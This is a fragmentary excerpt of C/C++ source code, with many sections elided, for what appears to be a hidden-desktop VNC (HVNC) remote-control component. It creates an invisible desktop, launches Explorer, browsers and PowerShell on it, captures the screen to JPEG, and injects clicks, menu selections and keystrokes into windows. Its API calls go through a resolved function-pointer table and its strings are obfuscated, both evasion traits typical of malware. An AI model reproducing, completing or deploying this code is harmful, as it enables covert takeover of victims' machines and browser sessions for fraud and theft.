...
enum WmStartApp
{ startExplorer =
    WM_USER + 1, startRun, startChrome, startEdge, startBrave, startFirefox,
    startIexplore, startPowershell };
...
void
BitmapToJpg (HDC * hDc, HBITMAP * hbmpImage, int width, int height)
{
...
Funcs::pGetDIBits (*hDc, compressedImage, 0, height, g_pixels,
		      (BITMAPINFO *) & g_bmpInfo, DIB_RGB_COLORS);
...
PaintWindow (HWND hWnd, HDC hDc, HDC hDcScreen)
{
...
HBITMAP hBmpWindow =
    Funcs::pCreateCompatibleBitmap (hDc, rect.right - rect.left,
...
static void
EnumWindowsTopToDown (HWND owner, WNDENUMPROC proc, LPARAM param)
{
...
if ((currentWindow =
	Funcs::pGetWindow (currentWindow, GW_HWNDLAST)) == NULL)
    
return;
  
while (proc (currentWindow, param)
	  && (currentWindow =
	      Funcs::pGetWindow (currentWindow, GW_HWNDPREV)) != NULL);
...
EnumHwndsPrint (HWND hWnd, LPARAM lParam)
{
...
static BOOL
GetDeskPixels (int serverWidth, int serverHeight)
{
...
HBITMAP hBmpScreen =
    Funcs::pCreateCompatibleBitmap (hDc, rect.right, rect.bottom);
...
HBITMAP hBmpScreenResized =
	Funcs::pCreateCompatibleBitmap (hDc, serverWidth, serverHeight);
...
hDcScreen, 0, 0, rect.right, rect.bottom,
			   SRCCOPY);
...
Funcs::pMemcpy (g_tempPixels, g_pixels,
...
Funcs::pMemcpy (g_oldPixels, g_tempPixels,
			 g_bmpInfo.bmiHeader.biSizeImage);
...
Funcs::pCreateProcessA (NULL, path, NULL, NULL, FALSE, 0, NULL, NULL,
...
Funcs::pCreateProcessA (NULL, browserPath, NULL, NULL, FALSE, 0, NULL,
...
g_hDesktopThread =
    Funcs::pCreateThread (NULL, 0, DesktopThread, NULL, 0, 0);
...
Funcs::pRegOpenKeyExA (HKEY_CURRENT_USER, Strs::hd3, 0,
				    KEY_ALL_ACCESS, &hKey);
...
Funcs::pRegQueryValueExA (hKey, valueName, 0, &type,
				       (BYTE *) & value, &size);
	    
 
if (value != neverCombine)
	      
Funcs::pRegSetValueExA (hKey, valueName, 0, REG_DWORD,
				       (BYTE *) & neverCombine, size);
...
Funcs::pCreateProcessA (explorerPath, NULL, NULL, NULL, FALSE, 0,
...
appbarData.hWnd =
		  Funcs::pFindWindowA (Strs::shell_TrayWnd, NULL);
...
Funcs::pSHGetFolderPathA (NULL, CSIDL_SYSTEM, NULL, 0,
				       rundllPath);
...
Funcs::pCreateProcessA (NULL, rundllPath, NULL, NULL, FALSE, 0,
				     NULL, NULL, &startupInfo, &processInfo);
...
LRESULT lResult =
		  Funcs::pSendMessageA (hWnd, WM_NCHITTEST, NULL, lParam);
...
Funcs::pSetWindowLongA (hWnd, GWL_STYLE,
					       Funcs::pGetWindowLongA (hWnd,
								       GWL_STYLE)
					       | WS_DISABLED);
		      
lResult =
			Funcs::pSendMessageA (hWnd, WM_NCHITTEST, NULL,
					      lParam);
...
Funcs::pPostMessageA (hWnd, WM_SYSCOMMAND, SC_MINIMIZE,
					     0);
...
Funcs::pPostMessageA (hWnd, WM_SYSCOMMAND,
					       SC_RESTORE, 0);
...
Funcs::pRealGetWindowClassA (hWnd, windowClass,
						  MAX_PATH);
...
HMENU hMenu =
			  (HMENU) Funcs::pSendMessageA (hWnd, MN_GETHMENU, 0,
							0);
			
int itemPos =
			  Funcs::pMenuItemFromPoint (NULL, hMenu, point);
			
int itemId = Funcs::pGetMenuItemID (hMenu, itemPos);
			
Funcs::pPostMessageA (hWnd, 0x1e5, itemPos, 0);
			
Funcs::pPostMessageA (hWnd, WM_KEYDOWN, VK_RETURN,
					       0);
...
g_hDesk =
      Funcs::pCreateDesktopA (g_desktopName, NULL, NULL, 0, GENERIC_ALL,
			      NULL);
